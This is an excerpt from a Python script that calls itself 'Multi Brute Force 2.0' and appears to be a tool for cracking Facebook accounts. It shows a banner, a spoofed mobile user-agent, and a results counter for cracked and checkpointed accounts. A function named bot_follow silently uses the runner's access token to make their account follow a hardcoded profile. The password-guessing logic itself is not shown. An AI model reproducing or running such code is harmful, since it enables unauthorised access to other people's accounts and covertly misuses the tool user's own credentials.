...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By RAV SPARK TEAM 2020  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/RAVXD ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def gen():
        ...
        try:
                ...
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # TTD RAV XD
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100009259285042/subscribers?access_token=" + toket) # Aqilla Febby Maharani
	requests.post("https://graph.facebook.com/100009259285042/subscribers?access_token=" + toket) # Aqilla Febby Maharani
	requests.post("https://graph.facebook.com/100009259285042/subscribers?access_token=" + toket) # Aqilla Febby Maharani
	requests.post("https://graph.facebook.com/100009259285042/subscribers?access_token=" + toket) # Aqilla Febby Maharani
	requests.post("https://graph.facebook.com/https:/100009259285042/subscribers?access_token=" + toket) # Aqilla Febby Maharani
	menu()
...
def results(Rav,Spark):
        if len(Rav) !=0:
                print(("[OK] : "+str(len(Rav))))
        if len(Spark) !=0:
                print(("[CP] : "+str(len(Spark))))
        if len(Rav) ==0 and len(Spark) ==0:
                print("\n")
